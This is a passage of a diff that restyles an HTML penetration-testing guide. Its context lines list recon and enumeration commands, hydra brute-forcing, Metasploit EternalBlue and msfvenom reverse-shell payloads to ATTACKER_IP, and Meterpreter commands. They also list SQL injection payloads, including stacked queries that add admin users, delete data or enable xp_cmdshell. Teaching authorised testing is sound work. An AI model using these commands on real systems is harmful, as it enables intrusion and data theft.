+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">LinkedIn Recon</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># LinkedIn search operators (in LinkedIn search bar)
+<pre><code># LinkedIn search operators (in LinkedIn search bar)
 # Find employees at target
 "Works at Target Company"
 
@@ -3737,9 +3738,9 @@ exiftool -r /path/to/images/
 
 <h3>Basic Scanning</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Nmap Fundamentals</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Nmap Fundamentals</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Ping sweep — discover live hosts
+<pre><code># Ping sweep — discover live hosts
 nmap -sn 192.168.1.0/24
 nmap -sn -PE 192.168.1.0/24          # ICMP echo only
 nmap -sn -PA80,443 192.168.1.0/24    # TCP ACK ping
@@ -3789,9 +3790,9 @@ nmap -A 192.168.1.1</code></pre>
 
 <h3>Nmap Scripting Engine (NSE)</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">NSE Scripts</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">NSE Scripts</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Default scripts (-sC equivalent)
+<pre><code># Default scripts (-sC equivalent)
 nmap -sC 192.168.1.1
 
 # Specific script categories
@@ -3836,9 +3837,9 @@ nmap --script=snmp-info -p 161 target</code></pre>
 </table>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Timing &amp; Rate Control</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Timing &amp; Rate Control</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Control parallelism
+<pre><code># Control parallelism
 nmap --min-parallelism 10 --max-parallelism 100 target
 
 # Control rate
@@ -3859,9 +3860,9 @@ nmap -sS -sV -sC -O -p- --min-rate 5000 -T4 \
 
 <h3>Nmap Output Formats</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Nmap Output</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Nmap Output</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Normal output (human readable)
+<pre><code># Normal output (human readable)
 nmap -oN scan_results.txt target
 
 # XML output (for tools like Metasploit, EyeWitness)
@@ -3891,9 +3892,9 @@ xsltproc scan_results.xml -o scan_results.html</code></pre>
 <p>The fastest internet port scanner. Can scan the entire IPv4 address space in under 5 minutes. Asynchronous, zero-loss, SYN-only.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Masscan Usage</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Masscan Usage</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Scan a single target — all ports
+<pre><code># Scan a single target — all ports
 masscan 192.168.1.1 -p0-65535 --rate=1000
 
 # Scan a /24 network for common ports
@@ -3935,9 +3936,9 @@ nmap -sV -sC -iL masscan_targets.txt</code></pre>
 
 <h3>Nessus</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Nessus Scanner</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Nessus Scanner</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Nessus Professional — commercial vulnerability scanner
+<pre><code># Nessus Professional — commercial vulnerability scanner
 # Install: download from tenable.com, install .deb/.rpm
 
 # Web interface: https://localhost:8834
@@ -3965,9 +3966,9 @@ curl -k -X POST https://localhost:8834/session \
 
 <h3>OpenVAS (Greenbone)</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">OpenVAS / Greenbone Vulnerability Manager</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">OpenVAS / Greenbone Vulnerability Manager</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Install OpenVAS (Kali has it pre-installed)
+<pre><code># Install OpenVAS (Kali has it pre-installed)
 apt update &amp;&amp; apt install gvm
 gvm-setup
 gvm-check-setup
@@ -3993,9 +3994,9 @@ gvm-start
 
 <h3>Nuclei — Fast Vulnerability Scanning</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Nuclei Scanner</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Nuclei Scanner</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Install nuclei
+<pre><code># Install nuclei
 go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
 
 # Update templates
@@ -4035,9 +4036,9 @@ nuclei -u target.com -dry-run</code></pre>
 
 <h3>SMB Enumeration (Port 445/139)</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">SMB Enumeration</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">SMB Enumeration</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Enum4share — enumerate SMB shares
+<pre><code># Enum4share — enumerate SMB shares
 enum4share -a 192.168.1.1
 enum4share -a 192.168.1.1 -u user -p pass  # authenticated
 
@@ -4064,9 +4065,9 @@ smbmap -H 192.168.1.1 -u user -p pass -R  # recursive listing</code></pre>
 
 <h3>SNMP Enumeration (Port 161/162)</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">SNMP Enumeration</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">SNMP Enumeration</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># snmpwalk — walk the MIB tree
+<pre><code># snmpwalk — walk the MIB tree
 snmpwalk -v2c -c public 192.168.1.1
 snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.1  # system info
 snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.4.1.77.1.2  # users
@@ -4088,9 +4089,9 @@ onesixtyone -c community.txt 192.168.1.1
 
 <h3>SMTP Enumeration (Port 25/587)</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">SMTP Enumeration</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">SMTP Enumeration</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Manual SMTP enumeration
+<pre><code># Manual SMTP enumeration
 nc -nv 192.168.1.1 25
 EHLO test
 VRFY root
@@ -4112,9 +4113,9 @@ swaks --to victim@target.com --from attacker@evil.com \
 
 <h3>LDAP Enumeration (Port 389/636)</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">LDAP Enumeration</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">LDAP Enumeration</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># ldapsearch — query LDAP directory
+<pre><code># ldapsearch — query LDAP directory
 ldapsearch -x -H ldap://192.168.1.1 -b "dc=target,dc=com"
 ldapsearch -x -H ldap://192.168.1.1 -b "dc=target,dc=com" \
   "(objectClass=user)" sAMAccountName
@@ -4135,9 +4136,9 @@ windapsearch -d target.com --dc 192.168.1.1 --enum-groups</code></pre>
 
 <h3>SSH Enumeration (Port 22)</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">SSH Enumeration</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">SSH Enumeration</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Banner grab
+<pre><code># Banner grab
 nc -nv 192.168.1.1 22
 # Returns: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
 
@@ -4159,9 +4160,9 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
 
 <h3>FTP Enumeration (Port 21)</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">FTP Enumeration</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">FTP Enumeration</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Banner grab
+<pre><code># Banner grab
 nc -nv 192.168.1.1 21
 
 # Anonymous login test
@@ -4186,9 +4187,9 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
 
 <h3>HTTP Enumeration (Port 80/443)</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">HTTP Enumeration</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">HTTP Enumeration</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Banner and header analysis
+<pre><code># Banner and header analysis
 curl -I https://target.com
 curl -s -D- https://target.com
 
@@ -4211,9 +4212,9 @@ curl -sI https://target.com | grep -iE \
 
 <h3>Database Enumeration</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Database Port Enumeration</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Database Port Enumeration</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># MySQL (3306)
+<pre><code># MySQL (3306)
 nmap --script=mysql-info,mysql-enum,mysql-brute -p 3306 192.168.1.1
 mysql -h 192.168.1.1 -u root -p
 
@@ -4241,9 +4242,9 @@ redis-cli -h 192.168.1.1 INFO</code></pre>
 
 <h3>Directory &amp; File Brute-Forcing</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Directory Brute-Force</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Directory Brute-Force</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Gobuster — fast directory/file/DNS brute-forcer
+<pre><code># Gobuster — fast directory/file/DNS brute-forcer
 # Directory mode
 gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
   -t 50 -x php,html,js,txt,bak,old,zip
@@ -4279,9 +4280,9 @@ ffuf -u https://target.com/FUZZ -w wordlist.txt -fs 4242</code></pre>
 
 <h3>Virtual Host Discovery</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Vhost Enumeration</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Vhost Enumeration</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Many web servers serve different content based on the Host header
+<pre><code># Many web servers serve different content based on the Host header
 
 # Manual vhost discovery
 for sub in admin staging dev api; do
@@ -4306,9 +4307,9 @@ gobuster vhost -u https://target.com -w vhosts.txt --append-domain
 
 <h3>JavaScript Analysis</h3>
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">JavaScript Recon</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">JavaScript Recon</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># LinkFinder — extract endpoints from JS
+<pre><code># LinkFinder — extract endpoints from JS
 linkfinder -i https://target.com/app.js -o cli
 
 # Get all JS files from a page
@@ -4337,9 +4338,9 @@ cat app.js | grep -oP '["/][a-zA-Z0-9/_-]*\.(php|asp|js|api|json)[^"]*'
 <p>Retrieve service banners to identify software, version numbers, and OS information.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">Banner Grabbing Techniques</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">Banner Grabbing Techniques</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Netcat banner grab
+<pre><code># Netcat banner grab
 nc -nv 192.168.1.1 22    # SSH
 nc -nv 192.168.1.1 21    # FTP
 nc -nv 192.168.1.1 80    # HTTP (then type HEAD /)
@@ -4374,9 +4375,9 @@ nmap -sV --version-intensity 9 192.168.1.1  # heavy
 <p>Determine the operating system of a target host through network-level analysis.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><span></span><span></span><span></span><span class="tbox-bt">OS Fingerprinting Methods</span></div>
+<div class="tbox-bar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tbox-bt">OS Fingerprinting Methods</span></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)">Copy</button><code># Nmap OS detection (requires SYN scan)
+<pre><code># Nmap OS detection (requires SYN scan)
 sudo nmap -O 192.168.1.1
 sudo nmap -O --osscan-guess 192.168.1.1  # aggressive guess
 
@@ -4504,7 +4505,7 @@ Without a structured methodology, penetration testing becomes random vulnerabili
 <h2 class="h2">The 5 Phases of Ethical Hacking</h2>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Phase 1 &mdash; Reconnaissance (Information Gathering)</span>
 </div>
@@ -4515,9 +4516,9 @@ Without a structured methodology, penetration testing becomes random vulnerabili
 <p>Gathering information without directly interacting with the target's infrastructure. All queries go through third-party sources.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Passive Recon Commands</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Passive Recon Commands</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># WHOIS lookup
+<pre><code># WHOIS lookup
 whois example.com
 
 # DNS records
@@ -4559,9 +4560,9 @@ theHarvester -d example.com -b google,bing,linkedin</code></pre>
 <p>Directly interacting with the target's infrastructure. Higher risk of detection &mdash; must stay within RoE boundaries.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Active Recon Commands</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Active Recon Commands</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Nmap host discovery
+<pre><code># Nmap host discovery
 nmap -sn 192.168.1.0/24
 
 # Full TCP port scan with version detection
@@ -4601,7 +4602,7 @@ Active reconnaissance can be illegal without explicit written authorization. Eve
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Phase 2 &mdash; Scanning &amp; Enumeration</span>
 </div>
@@ -4609,9 +4610,9 @@ Active reconnaissance can be illegal without explicit written authorization. Eve
 <p>Building on recon, scanning actively probes discovered services for vulnerabilities, misconfigurations, and exploitable weaknesses.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Scanning Workflows</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Scanning Workflows</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Vulnerability scanning with Nmap scripts
+<pre><code># Vulnerability scanning with Nmap scripts
 nmap --script vuln -p 80,443,445,3389 example.com
 
 # SMB enumeration
@@ -4647,7 +4648,7 @@ curl -I https://example.com</code></pre>
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Phase 3 &mdash; Vulnerability Analysis</span>
 </div>
@@ -4674,7 +4675,7 @@ Don't just list CVEs. A CVE with a public exploit that reaches the internal netw
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Phase 4 &mdash; Exploitation</span>
 </div>
@@ -4682,9 +4683,9 @@ Don't just list CVEs. A CVE with a public exploit that reaches the internal netw
 <p>Controlled exploitation to prove vulnerability existence and demonstrate real-world impact.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Common Exploitation Workflows</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Common Exploitation Workflows</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Metasploit exploitation
+<pre><code># Metasploit exploitation
 msfconsole
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS target_ip
@@ -4711,7 +4712,7 @@ Never cause a denial of service. Never exfiltrate real customer PII without perm
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Phase 5 &mdash; Post-Exploitation &amp; Reporting</span>
 </div>
@@ -4774,15 +4775,15 @@ Never cause a denial of service. Never exfiltrate real customer PII without perm
 <p>Open Source Intelligence is the art of gathering actionable intelligence from publicly available sources.</p>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Google Dorking Patterns</span>
 </div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Google Dork Reference</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Google Dork Reference</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Find exposed login pages
+<pre><code># Find exposed login pages
 site:example.com inurl:login | inurl:admin | inurl:dashboard
 
 # Find exposed documents
@@ -4814,15 +4815,15 @@ site:example.com ext:bak | ext:old | ext:sql | ext:git | ext:svn</code></pre>
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Email &amp; Employee Enumeration</span>
 </div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Email Discovery</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Email Discovery</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Hunter.io - find email patterns
+<pre><code># Hunter.io - find email patterns
 curl -s "https://api.hunter.io/v2/domain-search?domain=example.com&amp;api_key=YOUR_KEY"
 
 # theHarvester
@@ -4839,15 +4840,15 @@ theHarvester -d example.com -b google,linkedin,github -l 500
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Infrastructure OSINT</span>
 </div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Infrastructure Discovery</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Infrastructure Discovery</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Shodan - Internet-wide device search
+<pre><code># Shodan - Internet-wide device search
 shodan search "org:Example Inc" --filename shodan_results.json
 shodan host TARGET_IP
 
@@ -4926,7 +4927,7 @@ Both Red and Blue teams use MITRE ATT&amp;CK as their common language. Red teams
 <h2 class="h2">Report Writing Guidelines</h2>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Finding Structure Template</span>
 </div>
@@ -4949,7 +4950,7 @@ Both Red and Blue teams use MITRE ATT&amp;CK as their common language. Red teams
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Executive Summary Best Practices</span>
 </div>
@@ -5026,9 +5027,9 @@ This section covers exploitation techniques for educational purposes and authori
 
 <h3 class="h3">Metasploit Workflow</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Metasploit Console &mdash; Full Workflow</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Metasploit Console &mdash; Full Workflow</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Start Metasploit
+<pre><code># Start Metasploit
 msfconsole
 
 # Search for exploits
@@ -5074,9 +5075,9 @@ sessions -u 1</code></pre>
 
 <h3 class="h3">Msfvenom Payload Generation</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Msfvenom &mdash; All Platforms</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Msfvenom &mdash; All Platforms</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># List all payloads, formats, encoders
+<pre><code># List all payloads, formats, encoders
 msfvenom -l payloads
 msfvenom -l formats
 msfvenom -l encoders
@@ -5149,9 +5150,9 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f exe
 
 <h3 class="h3">Meterpreter Commands</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Meterpreter Post-Exploitation Commands</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Meterpreter Post-Exploitation Commands</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># --- System Info ---
+<pre><code># --- System Info ---
 sysinfo                    # OS, architecture, computer name
 getuid                     # Current user
 getpid                     # Current process ID
@@ -5217,9 +5218,9 @@ sessions -k ID             # Kill session</code></pre>
 
 <h3 class="h3">Multi/Handler Setup</h3>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Catching Shells with Multi/Handler</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Catching Shells with Multi/Handler</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Start a listener in Metasploit
+<pre><code># Start a listener in Metasploit
 msfconsole
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
@@ -5248,7 +5249,7 @@ exploit</code></pre>
 <h3 class="h3">Types of SQL Injection</h3>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Union-Based SQL Injection</span>
 </div>
@@ -5256,9 +5257,9 @@ exploit</code></pre>
 <p>Uses UNION SELECT to combine results from the original query with results from injected query. Requires knowing the exact number of columns.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Union-Based SQLi Technique</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Union-Based SQLi Technique</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Step 1: Find number of columns using ORDER BY
+<pre><code># Step 1: Find number of columns using ORDER BY
 https://example.com/page?id=1 ORDER BY 1-- -
 https://example.com/page?id=1 ORDER BY 2-- -
 https://example.com/page?id=1 ORDER BY 3-- -
@@ -5297,7 +5298,7 @@ UNION SELECT 1,CONCAT(username,0x3a,email,0x3a,password) FROM users LIMIT 0,1-- 
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Blind SQL Injection</span>
 </div>
@@ -5306,9 +5307,9 @@ UNION SELECT 1,CONCAT(username,0x3a,email,0x3a,password) FROM users LIMIT 0,1-- 
 
 <h4 class="h4">Boolean-Based Blind</h4>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Boolean Blind SQLi</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Boolean Blind SQLi</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Test with true condition - should return normal page
+<pre><code># Test with true condition - should return normal page
 https://example.com/page?id=1 AND 1=1-- -
 
 # Test with false condition - should return different page
@@ -5334,9 +5335,9 @@ https://example.com/page?id=1 AND SUBSTRING(database(),2,1)='y'-- -</code></pre>
 
 <h4 class="h4">Time-Based Blind</h4>
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Time-Based Blind SQLi</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Time-Based Blind SQLi</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># MySQL - conditional delay
+<pre><code># MySQL - conditional delay
 https://example.com/page?id=1 AND IF(1=1, SLEEP(5), 0)-- -
 # If page takes 5+ seconds, injection works
 
@@ -5355,7 +5356,7 @@ https://example.com/page?id=1; IF (1=1) WAITFOR DELAY '0:0:5'-- -</code></pre>
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Error-Based SQL Injection</span>
 </div>
@@ -5363,9 +5364,9 @@ https://example.com/page?id=1; IF (1=1) WAITFOR DELAY '0:0:5'-- -</code></pre>
 <p>Forces the database to generate error messages that contain the extracted data.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Error-Based SQLi Techniques</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Error-Based SQLi Techniques</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># MySQL - extractvalue / updatexml
+<pre><code># MySQL - extractvalue / updatexml
 https://example.com/page?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))-- -
 # Error: XPATH syntax error: '~myapp_db~'
 
@@ -5386,7 +5387,7 @@ https://example.com/page?id=1 AND 1=CONVERT(INT, (SELECT TOP 1 table_name FROM i
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Stacked Queries</span>
 </div>
@@ -5394,9 +5395,9 @@ https://example.com/page?id=1 AND 1=CONVERT(INT, (SELECT TOP 1 table_name FROM i
 <p>Allows executing multiple SQL statements by appending <code>;</code>. Extremely dangerous &mdash; can lead to full database compromise.</p>
 
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">Stacked Queries SQLi</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">Stacked Queries SQLi</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Insert a new admin user
+<pre><code># Insert a new admin user
 https://example.com/page?id=1; INSERT INTO users(username,password) VALUES('hacker','hashedpass')-- -
 
 # Delete data
@@ -5413,15 +5414,15 @@ https://example.com/page?id=1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; 
 </div>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">SQLMap Automation</span>
 </div>
 <div class="col-b">
 <div class="tbox">
-<div class="tbox-bar"><div class="dots"><span></span><span></span><span></span></div><div class="title">SQLMap &mdash; The SQLi Swiss Army Knife</div></div>
+<div class="tbox-bar"><div class="dots"><div class="td r"></div><div class="td y"></div><div class="td g"></div></div><div class="title">SQLMap &mdash; The SQLi Swiss Army Knife</div></div>
 <div class="tbox-b">
-<pre><button class="cpy" onclick="copyCode(this)"></button><code># Basic scan
+<pre><code># Basic scan
 sqlmap -u "https://example.com/page?id=1" --batch
 
 # Test POST parameter
@@ -5483,15 +5484,15 @@ sqlmap -u "https://example.com/page?id=1" --level=5 --risk=3 --batch</code></pre
 </table>
 
 <div class="col">
-<div class="col-h" onclick="toggleCol(this)">
+<div class="col-h">
 <span class="ci">&#9654;</span>
 <span class="ct">Reflected XSS Payloads &amp; Bypasses</span>
 </div>
 <div class="col-b">
